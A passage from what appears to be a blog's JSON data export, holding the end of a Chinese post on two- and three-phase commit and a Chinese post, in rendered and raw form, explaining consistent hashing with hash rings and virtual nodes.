#x6BB5;&#x4E0E;&#x7B2C;&#x4E8C;&#x9636;&#x6BB5;&#x4E4B;&#x95F4;&#x63D2;&#x5165;&#x4E86;&#x4E00;&#x4E2A;&#x51C6;&#x5907;&#x9636;&#x6BB5;&#xFF0C;&#x4F7F;&#x5F97;&#x539F;&#x5148;&#x5728;&#x4E24;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x4E2D;&#xFF0C;&#x53C2;&#x4E0E;&#x8005;&#x5728;&#x6295;&#x7968;&#x4E4B;&#x540E;&#xFF0C;&#x7531;&#x4E8E;&#x534F;&#x8C03;&#x8005;&#x53D1;&#x751F;&#x5D29;&#x6E83;&#x6216;&#x9519;&#x8BEF;&#xFF0C;&#x800C;&#x5BFC;&#x81F4;&#x53C2;&#x4E0E;&#x8005;&#x5904;&#x4E8E;&#x65E0;&#x6CD5;&#x77E5;&#x6653;&#x662F;&#x5426;&#x63D0;&#x4EA4;&#x6216;&#x8005;&#x4E2D;&#x6B62;&#x7684;&#x201C;&#x4E0D;&#x786E;&#x5B9A;&#x72B6;&#x6001;&#x201D;&#x6240;&#x4EA7;&#x751F;&#x7684;&#x53EF;&#x80FD;&#x76F8;&#x5F53;&#x957F;&#x7684;&#x5EF6;&#x65F6;&#x7684;&#x95EE;&#x9898;[1]&#x5F97;&#x4EE5;&#x89E3;&#x51B3;&#x3002; &#x4E3E;&#x4F8B;&#x6765;&#x8BF4;&#xFF0C;&#x5047;&#x8BBE;&#x6709;&#x4E00;&#x4E2A;&#x51B3;&#x7B56;&#x5C0F;&#x7EC4;&#x7531;&#x4E00;&#x4E2A;&#x4E3B;&#x6301;&#x4EBA;&#x8D1F;&#x8D23;&#x4E0E;&#x591A;&#x4F4D;&#x7EC4;&#x5458;&#x4EE5;&#x7535;&#x8BDD;&#x8054;&#x7EDC;&#x65B9;&#x5F0F;&#x534F;&#x8C03;&#x662F;&#x5426;&#x901A;&#x8FC7;&#x4E00;&#x4E2A;&#x63D0;&#x6848;&#xFF0C;&#x4EE5;&#x4E24;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x6765;&#x8BF4;&#xFF0C;&#x4E3B;&#x6301;&#x4EBA;&#x6536;&#x5230;&#x4E00;&#x4E2A;&#x63D0;&#x6848;&#x8BF7;&#x6C42;&#xFF0C;&#x6253;&#x7535;&#x8BDD;&#x8DDF;&#x6BCF;&#x4E2A;&#x7EC4;&#x5458;&#x8BE2;&#x95EE;&#x662F;&#x5426;&#x901A;&#x8FC7;&#x5E76;&#x7EDF;&#x8BA1;&#x56DE;&#x590D;&#xFF0C;&#x7136;&#x540E;&#x5C06;&#x6700;&#x540E;&#x51B3;&#x5B9A;&#x6253;&#x7535;&#x8BDD;&#x901A;&#x77E5;&#x5404;&#x7EC4;&#x5458;&#x3002;&#x8981;&#x662F;&#x4E3B;&#x6301;&#x4EBA;&#x5728;&#x8DDF;&#x7B2C;&#x4E00;&#x4F4D;&#x7EC4;&#x5458;&#x901A;&#x5B8C;&#x7535;&#x8BDD;&#x540E;&#x5931;&#x5FC6;&#xFF0C;&#x800C;&#x7B2C;&#x4E00;&#x4F4D;&#x7EC4;&#x5458;&#x5728;&#x5F97;&#x77E5;&#x7ED3;&#x679C;&#x5E76;&#x6267;&#x884C;&#x540E;&#x8001;&#x4EBA;&#x75F4;&#x5446;&#xFF0C;&#x90A3;&#x4E48;&#x5373;&#x4F7F;&#x91CD;&#x65B0;&#x9009;&#x51FA;&#x4E3B;&#x6301;&#x4EBA;&#xFF0C;&#x4E5F;&#x6CA1;&#x4EBA;&#x77E5;&#x9053;&#x6700;&#x540E;&#x7684;&#x63D0;&#x6848;&#x51B3;&#x5B9A;&#x662F;&#x4EC0;&#x4E48;&#xFF0C;&#x4E5F;&#x8BB8;&#x662F;&#x901A;&#x8FC7;&#xFF0C;&#x4E5F;&#x8BB8;&#x662F;&#x9A73;&#x56DE;&#xFF0C;&#x4E0D;&#x7BA1;&#x5927;&#x5BB6;&#x9009;&#x62E9;&#x54EA;&#x4E00;&#x79CD;&#x51B3;&#x5B9A;&#xFF0C;&#x90FD;&#x6709;&#x53EF;&#x80FD;&#x4E0E;&#x7B2C;&#x4E00;&#x4F4D;&#x7EC4;&#x5458;&#x5DF2;&#x6267;&#x884C;&#x8FC7;&#x7684;&#x771F;&#x5B9E;&#x51B3;&#x5B9A;&#x4E0D;&#x4E00;&#x81F4;&#xFF0C;&#x8001;&#x677F;&#x5C31;&#x4F1A;&#x4E0D;&#x5F00;&#x5FC3;&#x8BA4;&#x4E3A;&#x51B3;&#x7B56;&#x5C0F;&#x7EC4;&#x6C9F;&#x901A;&#x6709;&#x95EE;&#x9898;&#x800C;&#x89E3;&#x96C7;&#x3002;&#x4E09;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x5373;&#x662F;&#x5F15;&#x5165;&#x4E86;&#x53E6;&#x4E00;&#x4E2A;&#x6B65;&#x9AA4;&#xFF0C;&#x4E3B;&#x6301;&#x4EBA;&#x6253;&#x7535;&#x8BDD;&#x8DDF;&#x7EC4;&#x5458;&#x901A;&#x77E5;&#x8BF7;&#x51C6;&#x5907;&#x901A;&#x8FC7;&#x63D0;&#x6848;&#xFF0C;&#x4EE5;&#x907F;&#x514D;&#x6CA1;&#x4EBA;&#x77E5;&#x9053;&#x771F;&#x5B9E;&#x51B3;&#x5B9A;&#x800C;&#x9020;&#x6210;&#x51B3;&#x5B9A;&#x4E0D;&#x4E00;&#x81F4;&#x7684;&#x5931;&#x4E1A;&#x5371;&#x673A;&#x3002;&#x4E3A;&#x4EC0;&#x4E48;&#x80FD;&#x591F;&#x89E3;&#x51B3;&#x4E8C;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x7684;&#x95EE;&#x9898;&#x5462;&#xFF1F;&#x56DE;&#x5230;&#x521A;&#x521A;&#x63D0;&#x5230;&#x7684;&#x72B6;&#x51B5;&#xFF0C;&#x5728;&#x4E3B;&#x6301;&#x4EBA;&#x901A;&#x77E5;&#x5B8C;&#x7B2C;&#x4E00;&#x4F4D;&#x7EC4;&#x5458;&#x8BF7;&#x51C6;&#x5907;&#x901A;&#x8FC7;&#x540E;&#x4E24;&#x4EBA;&#x610F;&#x5916;&#x5931;&#x5FC6;&#xFF0C;&#x5373;&#x4F7F;&#x6CA1;&#x4EBA;&#x77E5;&#x9053;&#x5168;&#x4F53;&#x5728;&#x7B2C;&#x4E00;&#x9636;&#x6BB5;&#x7684;&#x51B3;&#x5B9A;&#x4E3A;&#x4F55;&#xFF0C;&#x5168;&#x4F53;&#x51B3;&#x7B56;&#x7EC4;&#x5458;&#x4ECD;&#x53EF;&#x4EE5;&#x91CD;&#x65B0;&#x534F;&#x8C03;&#x8FC7;&#x7A0B;&#x6216;&#x76F4;&#x63A5;&#x5426;&#x51B3;&#xFF0C;&#x4E0D;&#x4F1A;&#x6709;&#x4E0D;&#x4E00;&#x81F4;&#x51B3;&#x5B9A;&#x800C;&#x5931;&#x4E1A;&#x3002;&#x90A3;&#x4E48;&#x5F53;&#x4E3B;&#x6301;&#x4EBA;&#x901A;&#x77E5;&#x5B8C;&#x5168;&#x4F53;&#x7EC4;&#x5458;&#x8BF7;&#x51C6;&#x5907;&#x901A;&#x8FC7;&#x5E76;&#x5F97;&#x5230;&#x5927;&#x5BB6;&#x7684;&#x518D;&#x6B21;&#x786E;&#x5B9A;&#x540E;&#x8FDB;&#x5165;&#x7B2C;&#x4E09;&#x9636;&#x6BB5;&#xFF0C;&#x5F53;&#x4E3B;&#x6301;&#x4EBA;&#x901A;&#x77E5;&#x7B2C;&#x4E00;&#x4F4D;&#x7EC4;&#x5458;&#x8BF7;&#x901A;&#x8FC7;&#x63D0;&#x6848;&#x540E;&#x4E24;&#x4EBA;&#x610F;&#x5916;&#x5931;&#x5FC6;&#xFF0C;&#x8FD9;&#x65F6;&#x5019;&#x5176;&#x4ED6;&#x7EC4;&#x5458;&#x518D;&#x91CD;&#x65B0;&#x9009;&#x51FA;&#x4E3B;&#x6301;&#x4EBA;&#x540E;&#xFF0C;&#x4ECD;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#x76EE;&#x524D;&#x81F3;&#x5C11;&#x662F;&#x5904;&#x4E8E;&#x51C6;&#x5907;&#x901A;&#x8FC7;&#x63D0;&#x6848;&#x9636;&#x6BB5;&#xFF0C;&#x8868;&#x793A;&#x7B2C;&#x4E00;&#x9636;&#x6BB5;&#x5927;&#x5BB6;&#x90FD;&#x5DF2;&#x7ECF;&#x51B3;&#x5B9A;&#x8981;&#x901A;&#x8FC7;&#x4E86;&#xFF0C;&#x6B64;&#x65F6;&#x4FBF;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x901A;&#x8FC7;&#x3002;</p>\n<hr>\n<h3 id=\"&#x540E;&#x8BB0;\"><a href=\"#&#x540E;&#x8BB0;\" class=\"headerlink\" title=\"&#x540E;&#x8BB0;\"></a>&#x540E;&#x8BB0;</h3><p>&#x4E86;&#x89E3;&#x4E86;2PC&#x548C;3PC&#x4E4B;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#xFF0C;&#x65E0;&#x8BBA;&#x662F;&#x4E8C;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x8FD8;&#x662F;&#x4E09;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x90FD;&#x65E0;&#x6CD5;&#x5F7B;&#x5E95;&#x89E3;&#x51B3;&#x5206;&#x5E03;&#x5F0F;&#x7684;&#x4E00;&#x81F4;&#x6027;&#x95EE;&#x9898;&#x3002;<br>Google Chubby&#x7684;&#x4F5C;&#x8005;Mike Burrows&#x8BF4;&#x8FC7;&#xFF0C; <strong>there is only one consensus protocol, and that&#x2019;s Paxos&#x201D; &#x2013; all other approaches are just broken versions of Paxos&#x3002;</strong> &#x610F;&#x5373;&#x4E16;&#x4E0A;&#x53EA;&#x6709;&#x4E00;&#x79CD;&#x4E00;&#x81F4;&#x6027;&#x7B97;&#x6CD5;&#xFF0C;&#x90A3;&#x5C31;&#x662F;Paxos&#xFF0C;&#x6240;&#x6709;&#x5176;&#x4ED6;&#x4E00;&#x81F4;&#x6027;&#x7B97;&#x6CD5;&#x90FD;&#x662F;Paxos&#x7B97;&#x6CD5;&#x7684;&#x4E0D;&#x5B8C;&#x6574;&#x7248;&#x3002;</p>"},{"title":"一致哈希","date":"2016-11-12T10:53:00.000Z","toc":false,"_content":"\n### 分布式算法\n\n**在做服务器负载均衡时候可供选择的负载均衡的算法有很多，包括： 轮循算法(Round Robin)、哈希算法(HASH)、最少连接算法(Least Connection)、响应速度算法(Response Time)、加权法(Weighted )等。其中哈希算法是最为常用的算法.**\n\n典型的应用场景是： 有N台服务器提供缓存服务，需要对服务器进行负载均衡，将请求平均分发到每台服务器上，每台机器负责1/N的服务。\n\n常用的算法是对hash结果取余数 (hash() mod N )：对机器编号从0到N-1，按照自定义的 hash()算法，对每个请求的hash()值按N取模，得到余数i，然后将请求分发到编号为i的机器。但这样的算法方法存在致命问题，如果某一台机器宕机，那么应该落在该机器的请求就无法得到正确的处理，这时需要将当掉的服务器从算法从去除，此时候会有(N-1)/N的服务器的缓存数据需要重新进行计算;如果新增一台机器，会有N /(N+1)的服务器的缓存数据需要进行重新计算。对于系统而言，这通常是不可接受的颠簸(因为这意味着大量缓存的失效或者数据需要转移)。那么，如何设计一个负载均衡策略，使得受到影响的请求尽可能的少呢?\n\n***在Memcached、Key-Value Store 、Bittorrent DHT、LVS中都采用了Consistent Hashing算法，可以说Consistent Hashing 是分布式系统负载均衡的首选算法。***\n\n<!-- more -->\n\n---\n\n### 一致哈希\n一致哈希是一种特殊的哈希算法。在使用一致哈希算法后，哈希表槽位数（大小）的改变平均只需要对 K/n 个关键字重新映射，其中 K是关键字的数量，n是槽位数量。**然而在传统的哈希表中，添加或删除一个槽位的几乎需要对所有关键字进行重新映射。**\n\n一致哈希由MIT的Karger及其合作者提出，现在这一思想已经扩展到其它领域。在这篇1997年发表的学术论文中介绍了“一致哈希”如何应用于用户易变的分布式Web服务中。哈希表中的每一个代表分布式系统中一个节点，在系统添加或删除节点只需要移动 K/n项。\n\n一致哈希也可用于实现健壮缓存来减少大型Web应用中系统部分失效带来的负面影响。\n\n一致哈希的概念还被应用于分布式散列表（DHT）的设计。DHT使用一致哈希来划分分布式系统的节点。所有关键字都可以通过一个连接所有节点的覆盖网络高效地定位到某个节点。\n\n---\n\n### 使用场景\n一致哈希主要用来避免上面所说到的新增或减少服务器时，大量服务器缓存需要重新更新的问题。 \n\n一致哈希尽可能使同一个资源映射到同一台缓存服务器。这种方式要求增加一台缓存服务器时，新的服务器尽量分担存储其他所有服务器的缓存资源。减少一台缓存服务器时，其他所有服务器也可以尽量分担存储它的缓存资源。 \n\n**一致哈希算法的主要思想是将每个缓存服务器与一个或多个哈希值域区间关联起来，其中区间边界通过计算缓存服务器对应的哈希值来决定。**（定义区间的哈希函数不一定和计算缓存服务器哈希值的函数相同，但是两个函数的返回值的范围需要匹配。）如果一个缓存服务器被移除，则它会从对应的区间会被并入到邻近的区间，其他的缓存服务器不需要任何改变。\n\n---\n\n### 相关实现\n一致哈希将每个对象映射到圆环边上的一个点，系统再将可用的节点机器映射到圆环的不同位置。\n\n查找某个对象对应的机器时，需要用一致哈希算法计算得到对象对应圆环边上位置，沿着圆环边上查找直到遇到某个节点机器，这台机器即为对象应该保存的位置。 \n\n**删除**一台节点机器时，这台机器上保存的所有对象都要移动到下一台机器。\n**添加**一台机器到圆环边上某个点时，这个点的下一台机器需要将这个节点前对应的对象移动到新机器上。\n**更改**对象在节点机器上的分布可以通过调整节点机器的位置来实现。\n\n---\n\n### 相关特性\n一致性hash算法提出了在动态变化的Cache环境中，判定哈希算法好坏的四个定义：\n- **平衡性(Balance)**\n平衡性是指哈希的结果能够尽可能分布到所有的缓冲中去，这样可以使得所有的缓冲空间都得到利用。很多哈希算法都能够满足这一条件。\n\n- **单调性(Monotonicity)**\n单调性是指如果已经有一些内容通过哈希分派到了相应的缓冲中，又有新的缓冲加入到系统中。哈希的结果应能够保证原有已分配的内容可以被映射到原有的或者新的缓冲中去，而不会被映射到旧的缓冲集合中的其他缓冲区。 \n\n- **分散性(Spread)**\n在分布式环境中，终端有可能看不到所有的缓冲，而是只能看到其中的一部分。当终端希望通过哈希过程将内容映射到缓冲上时，由于不同终端所见的缓冲范围有可能不同，从而导致哈希的结果不一致，最终的结果是相同的内容被不同的终端映射到不同的缓冲区中。这种情况显然是应该避免的，因为它导致相同内容被存储到不同缓冲中去，降低了系统存储的效率。分散性的定义就是上述情况发生的严重程度。好的哈希算法应能够尽量避免不一致的情况发生，也就是尽量降低分散性。 \n\n- **负载(Load)**\n负载问题实际上是从另一个角度看待分散性问题。既然不同的终端可能将相同的内容映射到不同的缓冲区中，那么对于一个特定的缓冲区而言，也可能被不同的用户映射为不同的内容。与分散性一样，这种情况也是应当避免的，因此好的哈希算法应能够尽量降低缓冲的负荷。\n\n---\n\n**接下来主要讲解一下一致性哈希算法具体是如何设计的.**\n\n### 环形Hash空间\n按照常用的hash算法来将对应的key哈希到一个具有2^32次方个桶的空间中，即0~(2^32)-1的数字空间中。现在我们可以将这些数字头尾相连，想象成一个闭合的环形。如下图\n![](http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%80%E8%87%B4%E5%93%88%E5%B8%8C/1.png)\n                                                                         \n### 把数据通过一定的hash算法处理后映射到环上\n现在我们将object1、object2、object3、object4四个对象通过特定的Hash函数计算出对应的key值，然后散列到Hash环上。如下图：\nHash(object1) = key1；\nHash(object2) = key2；\nHash(object3) = key3； \nHash(object4) = key4；\n![](http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%80%E8%87%B4%E5%93%88%E5%B8%8C/2.png)\n                                                           \n### 将机器通过hash算法映射到环上\n在采用一致性哈希算法的分布式集群中将新的机器加入，其原理是通过使用与对象存储一样的Hash算法将机器也映射到环中（一般情况下对机器的hash计算是采用机器的IP或者机器唯一的别名作为输入值），然后以顺时针的方向计算，将所有对象存储到离自己最近的机器中。\n假设现在有NODE1，NODE2，NODE3三台机器，通过Hash算法得到对应的KEY值，映射到环中，其示意图如下：\nHash(NODE1) = KEY1;\nHash(NODE2) = KEY2;\nHash(NODE3) = KEY3;\n![](http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%80%E8%87%B4%E5%93%88%E5%B8%8C/3.png)\n                                                             \n通过上图可以看出对象与机器处于同一哈希空间中，这样按顺时针转动object1存储到了NODE1中，object3存储到了NODE2中，object2、object4存储到了NODE3中。在这样的部署环境中，hash环是不会变更的，因此，通过算出对象的hash值就能快速的定位到对应的机器中，这样就能找到对象真正的存储位置了。\n\n### 机器的删除与添加\n普通hash求余算法最为不妥的地方就是在有机器的添加或者删除之后会照成大量的对象存储位置失效，这样就大大的不满足单调性了。下面来分析一下一致性哈希算法是如何处理的。\n\n1. 节点（机器）的删除\n以上面的分布为例，如果NODE2出现故障被删除了，那么按照顺时针迁移的方法，object3将会被迁移到NODE3中，这样仅仅是object3的映射位置发生了变化，其它的对象没有任何的改动。如下图：\n![](http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%80%E8%87%B4%E5%93%88%E5%B8%8C/4.png)\n                                                              \n2. 节点（机器）的添加 \n如果往集群中添加一个新的节点NODE4，通过对应的哈希算法得到KEY4，并映射到环中，如下图：\n![](http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%80%E8%87%B4%E5%93%88%E5%B8%8C/5.png)\n                                                              \n通过按顺时针迁移的规则，那么object2被迁移到了NODE4中，其它对象还保持这原有的存储位置。通过对节点的添加和删除的分析，一致性哈希算法在保持了单调性的同时，还是数据的迁移达到了最小，这样的算法对分布式集群来说是非常合适的，避免了大量数据迁移，减小了服务器的的压力。\n\n### 平衡性\n根据上面的图解分析，一致性哈希算法满足了单调性和负载均衡的特性以及一般hash算法的分散性，但这还并不能当做其被广泛应用的原由，因为还缺少了平衡性。下面将分析一致性哈希算法是如何满足平衡性的。hash算法是不保证平衡的，如上面只部署了NODE1和NODE3的情况（NODE2被删除的图），object1存储到了NODE1中，而object2、object3、object4都存储到了NODE3中，这样就照成了非常不平衡的状态。**在一致性哈希算法中，为了尽可能的满足平衡性，其引入了虚拟节点。**\n\n“虚拟节点”（ virtual node ）是实际节点（机器）在 hash 空间的复制品（ replica ），一实际个节点（机器）对应了若干个“虚拟节点”，这个对应个数也成为“复制个数”，“虚拟节点”在 hash 空间中以hash值排列。\n\n以上面只部署了NODE1和NODE3的情况（NODE2被删除的图）为例，之前的对象在机器上的分布很不均衡，现在我们以2个副本（复制个数）为例，这样整个hash环中就存在了4个虚拟节点，最后对象映射的关系图如下：\n![](http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%80%E8%87%B4%E5%93%88%E5%B8%8C/6.png)\n                                                                 \n根据上图可知对象的映射关系：object1->NODE1-1，object2->NODE1-2，object3->NODE3-2，object4->NODE3-1。通过虚拟节点的引入，对象的分布就比较均衡了。那么在实际操作中，正真的对象查询是如何工作的呢？对象从hash到虚拟节点到实际节点的转换如下图：\n![](http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%80%E8%87%B4%E5%93%88%E5%B8%8C/7.png)\n                                         \n“虚拟节点”的hash计算可以采用对应节点的IP地址加数字后缀的方式。例如假设NODE1的IP地址为192.168.1.100。引入“虚拟节点”前，计算 cache A 的 hash 值：\nHash(“192.168.1.100”);\n引入“虚拟节点”后，计算“虚拟节”点NODE1-1和NODE1-2的hash值：\nHash(“192.168.1.100#1”); // NODE1-1\nHash(“192.168.1.100#2”); // NODE1-2\n\n---\n\n### 总结\n目前一致性哈希基本成为了分布式系统组件的标准配置，例如Memcached的各种客户端都提供内置的一致性哈希支持。本文只是简要介绍了这个算法，更深入的内容可以参看论文《[Consistent Hashing and Random Trees: Distributed Caching Protocols for Relieving Hot Spots on the World Wide Web](http://www.akamai.com/dl/technical_publications/ConsistenHashingandRandomTreesDistributedCachingprotocolsforrelievingHotSpotsontheworldwideweb.pdf)》，同时提供一个[C语言版本](http://www.codeproject.com/KB/recipes/lib-conhash.aspx)的实现供参考。","source":"_posts/一致哈希.md","raw":"---\ntitle: 一致哈希\ncategories:\n  - 算法及理论\ntags:\n  - 分布式算法\ndate: 2016-11-12 18:53:00\ntoc: false\n---\n\n### 分布式算法\n\n**在做服务器负载均衡时候可供选择的负载均衡的算法有很多，包括： 轮循算法(Round Robin)、哈希算法(HASH)、最少连接算法(Least Connection)、响应速度算法(Response Time)、加权法(Weighted )等。其中哈希算法是最为常用的算法.**\n\n典型的应用场景是： 有N台服务器提供缓存服务，需要对服务器进行负载均衡，将请求平均分发到每台服务器上，每台机器负责1/N的服务。\n\n常用的算法是对hash结果取余数 (hash() mod N )：对机器编号从0到N-1，按照自定义的 hash()算法，对每个请求的hash()值按N取模，得到余数i，然后将请求分发到编号为i的机器。但这样的算法方法存在致命问题，如果某一台机器宕机，那么应该落在该机器的请求就无法得到正确的处理，这时需要将当掉的服务器从算法从去除，此时候会有(N-1)/N的服务器的缓存数据需要重新进行计算;如果新增一台机器，会有N /(N+1)的服务器的缓存数据需要进行重新计算。对于系统而言，这通常是不可接受的颠簸(因为这意味着大量缓存的失效或者数据需要转移)。那么，如何设计一个负载均衡策略，使得受到影响的请求尽可能的少呢?\n\n***在Memcached、Key-Value Store 、Bittorrent DHT、LVS中都采用了Consistent Hashing算法，可以说Consistent Hashing 是分布式系统负载均衡的首选算法。***\n\n<!-- more -->\n\n---\n\n### 一致哈希\n一致哈希是一种特殊的哈希算法。在使用一致哈希算法后，哈希表槽位数（大小）的改变平均只需要对 K/n 个关键字重新映射，其中 K是关键字的数量，n是槽位数量。**然而在传统的哈希表中，添加或删除一个槽位的几乎需要对所有关键字进行重新映射。**\n\n一致哈希由MIT的Karger及其合作者提出，现在这一思想已经扩展到其它领域。在这篇1997年发表的学术论文中介绍了“一致哈希”如何应用于用户易变的分布式Web服务中。哈希表中的每一个代表分布式系统中一个节点，在系统添加或删除节点只需要移动 K/n项。\n\n一致哈希也可用于实现健壮缓存来减少大型Web应用中系统部分失效带来的负面影响。\n\n一致哈希的概念还被应用于分布式散列表（DHT）的设计。DHT使用一致哈希来划分分布式系统的节点。所有关键字都可以通过一个连接所有节点的覆盖网络高效地定位到某个节点。\n\n---\n\n### 使用场景\n一致哈希主要用来避免上面所说到的新增或减少服务器时，大量服务器缓存需要重新更新的问题。 \n\n一致哈希尽可能使同一个资源映射到同一台缓存服务器。这种方式要求增加一台缓存服务器时，新的服务器尽量分担存储其他所有服务器的缓存资源。减少一台缓存服务器时，其他所有服务器也可以尽量分担存储它的缓存资源。 \n\n**一致哈希算法的主要思想是将每个缓存服务器与一个或多个哈希值域区间关联起来，其中区间边界通过计算缓存服务器对应的哈希值来决定。**（定义区间的哈希函数不一定和计算缓存服务器哈希值的函数相同，但是两个函数的返回值的范围需要匹配。）如果一个缓存服务器被移除，则它会从对应的区间会被并入到邻近的区间，其他的缓存服务器不需要任何改变。\n\n---\n\n### 相关实现\n一致哈希将每个对象映射到圆环边上的一个点，系统再将可用的节点机器映射到圆环的不同位置。\n\n查找某个对象对应的机器时，需要用一致哈希算法计算得到对象对应圆环边上位置，沿着圆环边上查找直到遇到某个节点机器，这台机器即为对象应该保存的位置。 \n\n**删除**一台节点机器时，这台机器上保存的所有对象都要移动到下一台机器。\n**添加**一台机器到圆环边上某个点时，这个点的下一台机器需要将这个节点前对应的对象移动到新机器上。\n**更改**对象在节点机器上的分布可以通过调整节点机器的位置来实现。\n\n---\n\n### 相关特性\n一致性hash算法提出了在动态变化的Cache环境中，判定哈希算法好坏的四个定义：\n- **平衡性(Balance)**\n平衡性是指哈希的结果能够尽可能分布到所有的缓冲中去，这样可以使得所有的缓冲空间都得到利用。很多哈希算法都能够满足这一条件。\n\n- **单调性(Monotonicity)**\n单调性是指如果已经有一些内容通过哈希分派到了相应的缓冲中，又有新的缓冲加入到系统中。哈希的结果应能够保证原有已分配的内容可以被映射到原有的或者新的缓冲中去，而不会被映射到旧的缓冲集合中的其他缓冲区。 \n\n- **分散性(Spread)**\n在分布式环境中，终端有可能看不到所有的缓冲，而是只能看到其中的一部分。当终端希望通过哈希过程将内容映射到缓冲上时，由于不同终端所见的缓冲范围有可能不同，从而导致哈希的结果不一致，最终的结果是相同的内容被不同的终端映射到不同的缓冲区中。这种情况显然是应该避免的，因为它导致相同内容被存储到不同缓冲中去，降低了系统存储的效率。分散性的定义就是上述情况发生的严重程度。好的哈希算法应能够尽量避免不一致的情况发生，也就是尽量降低分散性。 \n\n- **负载(Load)**\n负载问题实际上是从另一个角度看待分散性问题。既然不同的终端可能将相同的内容映射到不同的缓冲区中，那么对于一个特定的缓冲区而言，也可能被不同的用户映射为不同的内容。与分散性一样，这种情况也是应当避免的，因此好的哈希算法应能够尽量降低缓冲的负荷。\n\n---\n\n**接下来主要讲解一下一致性哈希算法具体是如何设计的.**\n\n### 环形Hash空间\n按照常用的hash算法来将对应的key哈希到一个具有2^32次方个桶的空间中，即0~(2^32)-1的数字空间中。现在我们可以将这些数字头尾相连，想象成一个闭合的环形。如下图\n![](http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%80%E8%87%B4%E5%93%88%E5%B8%8C/1.png)\n                                                                         \n### 把数据通过一定的hash算法处理后映射到环上\n现在我们将object1、object2、object3、object4四个对象通过特定的Hash函数计算出对应的key值，然后散列到Hash环上。如下图：\nHash(object1) = key1；\nHash(object2) = key2；\nHash(object3) = key3； \nHash(object4) = key4；\n![](http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%80%E8%87%B4%E5%93%88%E5%B8%8C/2.png)\n                                                           \n### 将机器通过hash算法映射到环上\n在采用一致性哈希算法的分布式集群中将新的机器加入，其原理是通过使用与对象存储一样的Hash算法将机器也映射到环中（一般情况下对机器的hash计算是采用机器的IP或者机器唯一的别名作为输入值），然后以顺时针的方向计算，将所有对象存储到离自己最近的机器中。\n假设现在有NODE1，NODE2，NODE3三台机器，通过Hash算法得到对应的KEY值，映射到环中，其示意图如下：\nHash(NODE1) = KEY1;\nHash(NODE2) = KEY2;\nHash(NODE3) = KEY3;\n![](http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%80%E8%87%B4%E5%93%88%E5%B8%8C/3.png)\n                                                             \n通过上图可以看出对象与机器处于同一哈希空间中，这样按顺时针转动object1存储到了NODE1中，object3存储到了NODE2中，object2、object4存储到了NODE3中。在这样的部署环境中，hash环是不会变更的，因此，通过算出对象的hash值就能快速的定位到对应的机器中，这样就能找到对象真正的存储位置了。\n\n### 机器的删除与添加\n普通hash求余算法最为不妥的地方就是在有机器的添加或者删除之后会照成大量的对象存储位置失效，这样就大大的不满足单调性了。下面来分析一下一致性哈希算法是如何处理的。\n\n1. 节点（机器）的删除\n以上面的分布为例，如果NODE2出现故障被删除了，那么按照顺时针迁移的方法，object3将会被迁移到NODE3中，这样仅仅是object3的映射位置发生了变化，其它的对象没有任何的改动。如下图：\n![](http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%80%E8%87%B4%E5%93%88%E5%B8%8C/4.png)\n                                                              \n2. 节点（机器）的添加 \n如果往集群中添加一个新的节点NODE4，通过对应的哈希算法得到KEY4，并映射到环中，如下图：\n![](http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%80%E8%87%B4%E5%93%88%E5%B8%8C/5.png)\n                                                              \n通过按顺时针迁移的规则，那么object2被迁移到了NODE4中，其它对象还保持这原有的存储位置。通过对节点的添加和删除的分析，一致性哈希算法在保持了单调性的同时，还是数据的迁移达到了最小，这样的算法对分布式集群来说是非常合适的，避免了大量数据迁移，减小了服务器的的压力。\n\n### 平衡性\n根据上面的图解分析，一致性哈希算法满足了单调性和负载均衡的特性以及一般hash算法的分散性，但这还并不能当做其被广泛应用的原由，因为还缺少了平衡性。下面将分析一致性哈希算法是如何满足平衡性的。hash算法是不保证平衡的，如上面只部署了NODE1和NODE3的情况（NODE2被删除的图），object1存储到了NODE1中，而object2、object3、object4都存储到了NODE3中，这样就照成了非常不平衡的状态。**在一致性哈希算法中，为了尽可能的满足平衡性，其引入了虚拟节点。**\n\n“虚拟节点”（ virtual node ）是实际节点（机器）在 hash 空间的复制品（ replica ），一实际个节点（机器）对应了若干个“虚拟节点”，这个对应个数也成为“复制个数”，“虚拟节点”在 hash 空间中以hash值排列。\n\n以上面只部署了NODE1和NODE3的情况（NODE2被删除的图）为例，之前的对象在机器上的分布很不均衡，现在我们以2个副本（复制个数）为例，这样整个hash环中就存在了4个虚拟节点，最后对象映射的关系图如下：\n![](http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%80%E8%87%B4%E5%93%88%E5%B8%8C/6.png)\n                                                                 \n根据上图可知对象的映射关系：object1->NODE1-1，object2->NODE1-2，object3->NODE3-2，object4->NODE3-1。通过虚拟节点的引入，对象的分布就比较均衡了。那么在实际操作中，正真的对象查询是如何工作的呢？对象从hash到虚拟节点到实际节点的转换如下图：\n![](http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%80%E8%87%B4%E5%93%88%E5%B8%8C/7.png)\n                                         \n“虚拟节点”的hash计算可以采用对应节点的IP地址加数字后缀的方式。例如假设NODE1的IP地址为192.168.1.100。引入“虚拟节点”前，计算 cache A 的 hash 值：\nHash(“192.168.1.100”);\n引入“虚拟节点”后，计算“虚拟节”点NODE1-1和NODE1-2的hash值：\nHash(“192.168.1.100#1”); // NODE1-1\nHash(“192.168.1.100#2”); // NODE1-2\n\n---\n\n### 